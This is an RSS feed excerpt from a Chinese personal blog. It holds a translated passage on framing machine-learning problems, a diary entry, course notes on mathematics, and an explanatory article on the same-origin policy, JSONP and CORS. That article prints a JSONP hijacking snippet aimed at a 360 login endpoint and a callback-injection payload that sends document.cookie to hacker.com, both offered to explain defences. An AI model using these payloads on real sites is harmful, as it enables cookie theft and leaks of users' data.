&lt;p&gt;建模阶段需要构建机器学习模型来解决当前的业务问题。基本上第一步就是“定义”一个机器学习问题，而且我们知道，这一步非常关键。问题定义的过程就是将业务case和概念输入然后输出一个定义好的模型问题（通常倾情况下是一个有监督的机器学习问题。）所以好的解决方案依赖给到模型的case和概念输入。通常要预测的点是给定的，这就固定了特征空间的范围，但是目标变量和观测空间并不总是给定的，并且需要被仔细的设计。举个例子，在考虑前面提到过的日期弹性模型时，我们想要知道用户每次提交搜索时的日期弹性。这里弹性的定义并不是非常的清楚：是不是意味着这个用户比别的用户考虑更多的候选日期？或者是用户最终会预定的日期和他们正在看的日期不一样？又或者是用户愿意为一个更好的价格修改预定日期？等等。这些每一种不同的对弹性的定义都可以有不同的学习步骤与之对应。比如，我们可以在一个由被观测用户组成的数据集上用回归的方法来学习预测一个用户可能会考虑多少个不同的日期，或者当观察的是搜索用户时，可以通过分类的方法来评估用户修改日期的可能性，等等。这些都是构建好的机器学习问题，然后我们解决他，输出一个用户的日期弹性模型。
为了比较可替代的问题，我们遵循一个简单的启发式的方法，其中考虑到：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;学习难度&lt;/strong&gt; 在对这些非常主观的概念进行建模时，目标变量不是以真值的方式给定的，而是通过构建出来的。然而，有些设定会比其他一些更难。量化可学习性是不容易的。对于分类问题，贝叶斯错误是一个很好的衡量指标，因为它只依赖于数据集。我们使用Tumer和Ghosh【12】的方法。另一种适用于排序问题的方法是将简单模型的性能和随机或大众这些基线进行比较。首选哪些简单模型可以比基线模型做的更好的设置。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;数据和概念的匹配&lt;/strong&gt; 有一些设置使用的数据更贴近我们想要建模的概念。比如在日期弹性的例子中，我们可以给一组日期，问用户他们是否知道他们想旅行的日子。然后构建一个模型来预测答案。这将是一个非常直接的分类问题，比起其他方案，更贴近日期弹性这个概念。但另一方面，这个数据会有严重的选择偏差，因为标签只适用于受访者。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;选择偏好&lt;/strong&gt; 如前所述，构建标签和观测空间很容易引入选择偏好。一个无偏的问题求对观测空间做1对1的映射，但这不总是可能的和最优的。判断选择偏差十分简单：考虑一个自然观测空间里的样本（数据弹性case里的用户或会话），我们可以构建一个分类问题，把目标变量可以被计算的归为一类，不可被计算的分为另一类。假如这个分类问题是很容易的（一个简单的算法表现会显著好于随机的结果），那个偏好就很严重并且一定被引入了。纠正这种类型的偏好是不明显的。像Inverse Propensity Weighting和Doubly Robust这样的技术在某些情况下有用，但这必须至少在构建一个额外的模型（propensity模型）。其他比如正样本和无标签学习（PU-learning）和半监督学习（Semi supervised learning）领域的相关方法曾经成功运用过但不够系统化。
问题构建过程打开了一个迭代维度。对于一个给定的业务场景和问题设定，提高模型性能是对产出价值最明显的方法，但是我们也可以改变问题设定本身。一个简单的例子就是把一个回归预测持续时间长度的问题转化成一个多分类问题。更复杂的例子是把基于点击数据的用户偏好模型转换成一个基于客户评价的自然语言处理问题。图三展示了一个更坚实的例子。6种成功的算法和4种不同的设定。Pr（Last Minute）将用户分成“最后一分钟的”或者“非最后一分钟的”两类。Pr(Booking)是一个转化模型。Pr（overlap）模型根据对入驻日期的部分重叠和基于无监督相似模型计算的目的地相似度对用户做出二次预定的可能性建模。
我们发现，最好的问题设定往往第一时间蹦到我们脑海里的那个，而且改变对问题的设定是一种释放价值非常有效的途径。
    &lt;h2 id=&quot;开发时间就是金钱&quot;&gt;开发：时间就是金钱&lt;/h2&gt;
    &lt;p&gt;在信息检索和推荐系统的环境里，过高的延迟对用户行为有负向影响是众所周知的。我们通过运行多臂 RCT 来量化延迟对我们平台的业务影响，其中分配给每个臂的用户都暴露于人工导致的延迟中。结果如图6（右下部分）所示。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Thu, 16 Dec 2021 00:00:00 +0800</pubDate>
        <link>http://laichendong.com/2021/12/16/150-successful-ML-models/</link>
        <guid isPermaLink="true">http://laichendong.com/2021/12/16/150-successful-ML-models/</guid>
        
        <category>翻译</category>
        
        
        <category>Reading</category>
        
      </item>
    
      <item>
        <title>倾听</title>
        <description>
</description>
        <pubDate>Thu, 02 Dec 2021 00:00:00 +0800</pubDate>
        <link>http://laichendong.com/2021/12/02/listening/</link>
        <guid isPermaLink="true">http://laichendong.com/2021/12/02/listening/</guid>
        
        <category>管理修炼</category>
        
        
        <category>Reading</category>
        
      </item>
    
      <item>
        <title>沟通-看到对方真正的需求，避免沟通僵局</title>
        <description>&lt;p&gt;沟通的第一定律：在沟通的过程中，人最本能的关注点都是自己&lt;/p&gt;
</description>
        <pubDate>Thu, 02 Dec 2021 00:00:00 +0800</pubDate>
        <link>http://laichendong.com/2021/12/02/communication/</link>
        <guid isPermaLink="true">http://laichendong.com/2021/12/02/communication/</guid>
        
        <category>管理修炼</category>
        
        
        <category>Reading</category>
        
      </item>
    
      <item>
        <title>log-2020年06月23日</title>
        <description>&lt;p&gt;2020年06月23日 晴&lt;/p&gt;

&lt;p&gt;听吴军的《阅读与写作课》提到用写日记的方式来训练自己的协作能力。就想着也记录一下。但，这是昨天的事儿了。&lt;/p&gt;

&lt;p&gt;有一个猎头推荐钉钉的岗位，开始是想去了解一下外面的机会，看看自己还行不行。打算去面试试试的。想起学良去年举家去了杭州钉钉，就问他大概情况。学良在京东的时候，交情也不深，只是隐约觉得这哥们还不错，挺厉害的。本是想随口问问，也没想如何。上午发了一条微信，半天也不见回话。心想：果然，没啥交情，现在人家离开了京东，更是没啥交集了。没想到下午给我回了一句，“打个电话？”我打过去之后直接聊了一个小时。与其说是聊了一个小时，倒不如说是他说了一个小时。从对杭州的看法，到对阿里的看法，到对钉钉的看法，从他的视角，对比北京与杭州，阿里与京东。说了很多，记住几点，1、钉钉很累；  2、阿里的数字化管理很先进，没准备好别试，免得留下不好的印象；3、既然想要出来，就要拼，既然要拼，进阿里就要去杭州。说的都挺在理的，也打消了我想去面试的想法。另外也感叹阿里的厉害，把厉害的人都吸引过去了，并且深度认同阿里。&lt;/p&gt;

&lt;p&gt;由于近半年的工作上的变动，让自己又感觉有些迷茫，觉得自己不够厉害了，出去没法拿到更高的薪水和待遇，不知道自己的核心竞争力是什么了。所谓的管理，也说不出123，人家面试找人，貌似也不看这些。&lt;/p&gt;

&lt;p&gt;自己招聘看到一些年纪大的，还在找一线工作，路宏波去年离职，今年就已经再进不了京东了。和乐哥聊天说我现在再折回技术路线有点晚了。真的晚了吗？ 不，一定不晚。&lt;/p&gt;

&lt;p&gt;保持对前沿技术动向的学习。同时将基础技术吃透吧。东东，你可以的！&lt;/p&gt;

</description>
        <pubDate>Tue, 23 Jun 2020 00:00:00 +0800</pubDate>
        <link>http://laichendong.com/2020/06/23/log-2020-06-23/</link>
        <guid isPermaLink="true">http://laichendong.com/2020/06/23/log-2020-06-23/</guid>
        
        
      </item>
    
      <item>
        <title>一篇聊透跨域</title>
        <description>&lt;p&gt;前几天面试一小哥哥，说到跨域问题，说的语焉不详的。所以将相关知识点整理了一下，成文如下：&lt;/p&gt;

&lt;h2 id=&quot;什么是跨域问题&quot;&gt;什么是跨域问题&lt;/h2&gt;

&lt;p&gt;通常大家所说的跨域问题，就是脚本要访问一个别的域名的数据时，发现被浏览器阻止了，访问不了，然后想各种办法去实现这个跨域名的数据读取，就被笼统的称作&lt;strong&gt;跨域问题&lt;/strong&gt;；但其实，跨域问题不是&lt;strong&gt;跨域&lt;/strong&gt;，而是&lt;strong&gt;跨源（cross-origin）&lt;/strong&gt;问题。现代浏览器里有一个叫做&lt;strong&gt;同源策略&lt;/strong&gt;的机制，正是这个机制阻止了资源的跨域访问。那么什么是同源策略，以及为什么要有这个策略呢？&lt;/p&gt;

&lt;h2 id=&quot;同源策略same-origin-policy&quot;&gt;同源策略（Same Origin Policy）&lt;/h2&gt;

&lt;p&gt;简单的说，同源策略是浏览器的一种&lt;strong&gt;安全机制&lt;/strong&gt;。他规定&lt;strong&gt;从某一个源（服务端）加载（到浏览器端）的页面（脚本）只能&lt;em&gt;访问（向xxx发请求）&lt;/em&gt;与他“&lt;em&gt;同源&lt;/em&gt;”的页面的&lt;em&gt;资源&lt;/em&gt;&lt;/strong&gt;。那“同源”里的&lt;strong&gt;源&lt;/strong&gt;又是什么意思呢？&lt;strong&gt;同源是指两个URL里的：协议（protocol），端口（port），域名（hosts）完全相同&lt;/strong&gt;，也就是URL的Scheme一致。例如：&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://abc.com  和 https://abc.com 不同源，协议不同
http://abc.com 和 http://abc.com:8080 不同源，端口不同
http://a.abc.com 和 http://b.abc.com 也不同源，域名不同
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;也就是说，上面这些页面之间都不能发送请求。你可能会感到奇怪，“我的网页的静态资源都放在cdn域名里，比如公共js，然后加载到页面执行，一点问题都没有啊”，这是不是违法了同源策略？嗯，所以同源策略里规定的“&lt;strong&gt;访问&lt;/strong&gt;”是一个相对模糊的概念。一般来说：&lt;strong&gt;内嵌一个跨源的资源是被允许的，但是读取一个跨源的资源是不允许的。&lt;/strong&gt;比如，你可以用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;iframe src=&apos;&apos;/&amp;gt;&lt;/code&gt;嵌入一个跨源的页面（当然，被嵌入的页面的服务器端可以设置&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-Frame-Options&lt;/code&gt;响应头来控制自己允不允许被iframe嵌入，可以在一定程度上防止黑客制作钓鱼网站），但不能用js获得这个被嵌入的页面里的dom对象引用。&lt;/p&gt;

&lt;p&gt;更具体的来说，下面列出来哪些动作被允许，哪些动作不被允许。&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1、**iframe**，  一般来说，用src跨源嵌入是可以的，但不让读取里面的内容

2、**css**，可以用link标签和@import来嵌入，但是要正确的设置Content-Type

3、**表单**，表单可以通过action属性提交到一个跨源的目的地页面，也就是说，跨源写是允许的

4、**图片**，图片可以用img标签嵌入，但是如果从一个跨源的地方读一张图片然后画到canvas上，则不允许（这相当于读了图片的内容）

5、**多媒体内容**，同理，视频和音频这些内容是可以通过video和audio标签内嵌到页面上来的。

6、**脚本**，脚本当然可以用script标签嵌入，但不能访问一些特定的api，比如通过XMLHttpRequest或Fetch发送跨域资源请求。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;为什么要有同源策略&quot;&gt;为什么要有同源策略？&lt;/h2&gt;

&lt;p&gt;总而言之，是搞了很多的限制。那为什么要搞这么多的限制呢，怪麻烦的。刚提到，同源策略是一个重要的安全策略。也就是说，是浏览器为了web安全而不得不搞出来的一种限制。想象一下，如果没有这个限制。一个源attacker.com的脚本可以读取xxx.bank.com页面的信息和往xxx.bank.com发请求的话。attacher就可以用脚本读取你在bank.com里的账号和密码，发起转账，等等都可以了。所以，同源策略，保护的是被跨源访问的域。这点是很多人没有彻底理解跨域问题的根源。&lt;/p&gt;

&lt;h2 id=&quot;但实际就有跨源资源访问的需求怎么办&quot;&gt;但实际就有跨源资源访问的需求怎么办？&lt;/h2&gt;

&lt;p&gt;同源策略安全是安全，但他是一刀切的方案，实际情况是真的有很多时候需要跨源访问资源：现代网站很多用域名做了垂直拆分，甚至很多本来就是公共服务，就希望被所有人访问到，比如天气预报数据等等，都被这个同源策略所阻止了。在之前，比较著名和流行的方式就是采用&lt;strong&gt;JSONP&lt;/strong&gt;技术来实现跨源访问。&lt;/p&gt;

&lt;h2 id=&quot;jsonpjson-with-padding技术&quot;&gt;JSONP（JSON with padding）技术&lt;/h2&gt;

&lt;p&gt;这是一种被普遍使用的，绕过浏览器同源策略的数据共享方法。他的基本思想是，在网页里插入一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script /&amp;gt;&lt;/code&gt;元素，用script标签的src属性加载一个跨源脚本（这是被允许的），这个脚本的服务端，将要共享的数据以JSON的格式放到一个指定名字的回调函数的入参里（with padding）传回来。页面的回调函数实现就拿到跨源的共享数据了。&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/**
* 工具函数，往页面里插入一个指定src的script标签，以发起请求
* 其实也可以发起ajax请，很多三方库（比如jQuery）都有封装
*/&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;addScriptTag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;text/javascript&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;function &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// 调用工具函数，发起请求，并告诉服务端，回调函数名字叫foo&lt;/span&gt;
  &lt;span class=&quot;nf&quot;&gt;addScriptTag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;http://example.com/ip?callback=foo&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// 服务端返回JSON格式的数据，并 放在一个叫 foo的函数调用的入参里，如下：&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// foo({&quot;ip&quot;: &quot;8.8.8.8&quot;});&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/**
* 回调函数，服务端返回的内容，会回调这个函数，并且把数据作为参数传入，这样就实现了跨源数据共享的目的
*/&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;Your public IP address is: &lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;从原理上来看，JSONP其实是一种Hacking技术，用一种巧妙的方式绕开了同源策略的限制，虽然能实现跨源访问的目的，但其实也会带来一些安全问题。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1、CSRF（ Cross-site request forgery 跨站请求伪造）攻击&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;如果通过JSONP获取的数据是敏感数据（比如用户登录之后才能读取到的数据），攻击者可以构造一个这样的请求，藏在某个页面里，如果用户在登录的情况下访问了那个页面（攻击者可以引诱被攻击者访问），就会在不知情的情况下将自己的数据泄露。比如&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;wooyun&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  	&lt;span class=&quot;c1&quot;&gt;// 这里可以干坏事，比如将用户的用户名，邮箱等发送到指定的地址， &lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 把这坨代码放注入到360的某个子域的页面里，就等着有人上钩了&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://js.login.360.cn/?o=sso&amp;amp;m=info&amp;amp;func=wooyun&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;也就是说，攻击者在被攻击者不知情的情况下向某个JSONP的服务端发送了请求（如果这个请求是转账？^_^）。所以要防止这种攻击，服务端除了要验证用户的登录状态，还要验证请求的Refer，增加token校验等等。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2、callback函数名可自定义，导致注入风险&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;因为，callback参数值会作为函数名传个服务器并传回来，在浏览器端执行，如果这个参数不是一个正常的函数名，而是一个表达式，甚至是一段脚本呢？就会有问题了。比如&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;/pay?callback=&amp;lt;srcript&amp;gt;$.get(&quot;http://hacker.com?cookie=&quot;+document.cookie)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;攻击者还可以构造一些更加精巧的callback内容，实现RFD攻击。&lt;/p&gt;

&lt;p&gt;要防止这种攻击，第一步要做的就是对callback参数的内容做转义，第二是要对返回的内容设置&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;conten-type=application/json&lt;/code&gt; （不能被执行）而不是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;application/javascript&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;想要更安全优雅的实现跨源资源共享该怎么办呢？其实早在2014年的时候w3c就通过了&lt;strong&gt;跨源资源共享（Cross-Origin Resource Sharing (CORS)）&lt;/strong&gt; 的标准。&lt;/p&gt;

&lt;h2 id=&quot;corscross-origin-resource-sharing跨源资源共享-技术&quot;&gt;CORS（Cross-Origin Resource Sharing）跨源资源共享 技术&lt;/h2&gt;

&lt;p&gt;上文说到，&lt;strong&gt;浏览器是为了保护被跨源访问的服务不被别人随意访问才不得不设置了同源策略，并且这种一刀切的方式带来了许多不便。那如果某个源的服务器明确告诉浏览器说，我这个服务是允许别人来访问的，你不用使用同源策略来禁止别人访问我，那不就没问题了&lt;/strong&gt;。这就是cors机制的基本原理。&lt;/p&gt;

&lt;p&gt;最基本的实现CORS和把大象装冰箱一样，总共分三步：&lt;/p&gt;

&lt;p&gt;1、浏览器发现是一个跨源请求，就在请求头上加一个字段&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Origin&lt;/code&gt;；包括协议，域名，端口。告诉被请求的服务端说，我是谁。&lt;/p&gt;

&lt;p&gt;2、服务器收到请求，应该检查这个Origin是不是被允许的访问来源，如果是被允许的，则在响应头上加上&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Access-Control-Allow-Origin&lt;/code&gt;，这个值可以是一个具体的origin，也可是是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt;表示允许所有源访问。&lt;/p&gt;

&lt;p&gt;3、浏览器收到服务器的响应，检查是否有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Access-Control-Allow-Origin&lt;/code&gt;头，如果有，才能把具体的响应体返回给请求发送者，否则报错，告诉请求发起方&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;access blocked by CORS policy&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;其实，我们发现，CORS虽然阻止了将响应返回个请求发送者，但实际上请求是有真的发送到服务端的！所以当我们在做服务端接口的时候，一定要注意先要检查请求的Origin，再决定是否做相应的动作。以免形成事实上的攻击。这个在nginx配置上一定要注意，不能无脑的反射Origin。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;复杂请求的先导请求&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;我觉得也是出于这个原因，CORS把请求分成普通请求和复杂请求（complex request），对于复杂请求（万一请求对服务端有伤害的请求？）先用一个先导请求（preflight request）去问下服务端是否接受这类请求，得到确认后再发送具体请求。先导请求是浏览器自动发送的，并且服务端可以设置缓存建议。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;用cors发送cookie？&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;除了Allow Origin这种源的白名单机制，cors还可以通过cookie实现对用户的身份认证，在请求头上加上 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;credentials: &apos;include&apos;&lt;/code&gt; 可以让请求带上cookie发送， 为了安全考虑，cors规定如果用了，则&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Access-Control-Allow-Origin&lt;/code&gt;必须指定具体的值，不能为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt;&lt;/p&gt;

</description>
        <pubDate>Tue, 09 Jun 2020 00:00:00 +0800</pubDate>
        <link>http://laichendong.com/2020/06/09/cross_domain/</link>
        <guid isPermaLink="true">http://laichendong.com/2020/06/09/cross_domain/</guid>
        
        <category>web</category>
        
        <category>跨域</category>
        
        
      </item>
    
      <item>
        <title>mathematics</title>
        <description>&lt;h2 id=&quot;数学通识50讲&quot;&gt;《数学通识50讲》&lt;/h2&gt;

&lt;h3 id=&quot;作者简介&quot;&gt;作者简介&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;吴军&lt;/strong&gt;（1967年4月 57岁），出生于北京。1989年毕业于&lt;a href=&quot;https://zh.wikipedia.org/wiki/清華大學&quot;&gt;清华大学&lt;/a&gt;计算机系和电子工程系，1993年至1996年执教于清华。1996年留学于美国约翰霍普金斯大学，2002年荣获霍普金斯大学计算机科学博士学位。&lt;/p&gt;

  &lt;p&gt;2002年6月至2010年4月,吴军曾担任Google研究院（Google Research）的资深研究员，著名自然语言处理专家，&lt;a href=&quot;https://zh.wikipedia.org/wiki/約翰霍普金斯大學&quot;&gt;约翰霍普金斯大学&lt;/a&gt;博士。在&lt;a href=&quot;https://zh.wikipedia.org/wiki/Google&quot;&gt;Google&lt;/a&gt;主要的贡献包括&lt;a href=&quot;https://zh.wikipedia.org/w/index.php?title=中日韓搜索算法&amp;amp;action=edit&amp;amp;redlink=1&quot;&gt;中日韩搜索算法&lt;/a&gt;，Google&lt;a href=&quot;https://zh.wikipedia.org/wiki/反垃圾邮件&quot;&gt;反垃圾邮件&lt;/a&gt;的创始人，和&lt;a href=&quot;https://zh.wikipedia.org/w/index.php?title=中日韓搜索&amp;amp;action=edit&amp;amp;redlink=1&quot;&gt;中日韩搜索&lt;/a&gt;部门的创始人。美国共和党党员[&lt;a href=&quot;https://zh.wikipedia.org/wiki/吴军_(计算机科学家)#cite_note-2&quot;&gt;2]&lt;/a&gt;。&lt;/p&gt;

  &lt;p&gt;吴军2010年离开Google后，2010年4月至2012年8月担任腾讯主管搜索的副总裁、约翰霍普金斯大学工学院董事。&lt;/p&gt;

  &lt;p&gt;2012年8月离开腾讯，2012年9月至2014年9月回到Google担任谷歌主任，工程师兼资深研究员。&lt;/p&gt;

  &lt;p&gt;2014年9月至今担任丰元资本(Amino Captial)合伙人。2016年9月至今担任中信出版独立董事。&lt;/p&gt;

  &lt;p&gt;除了在工程和研究上的贡献，他是畅销书《数学之美》、《浪潮之巅》、《硅谷之谜》、《文明之光》、《大学之路》和《智能时代》的作者。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;为什么要学数学通识&quot;&gt;为什么要学数学通识？&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;通识教育&lt;/strong&gt;的思想起源于19世纪，当时认为大学里的专业太过于专了，导致知识严重割裂，于是创造出通识教育，目的是培养学生能独立思考、且对不同的学科有所认识，以至能将不同的知识融会贯通。自20世纪后，通识教育已广泛成为欧美大学的一项必修科目。吴军认为，世界上的顶级名校和二流大学相比，专业课其实亮点不太突出，关键是同时教育做得好，有了好的同事教育的基础，在职业道路上才能走的更远。&lt;/p&gt;

&lt;p&gt;他还认为，成年人接受数学通识教育，只要做到一点就够了，就是从理解初等数学到理解高等数学。也就是把自己对所有和数学相关的概念和方法从静态的，具体的上升到动态的，规律的就可以了。&lt;/p&gt;

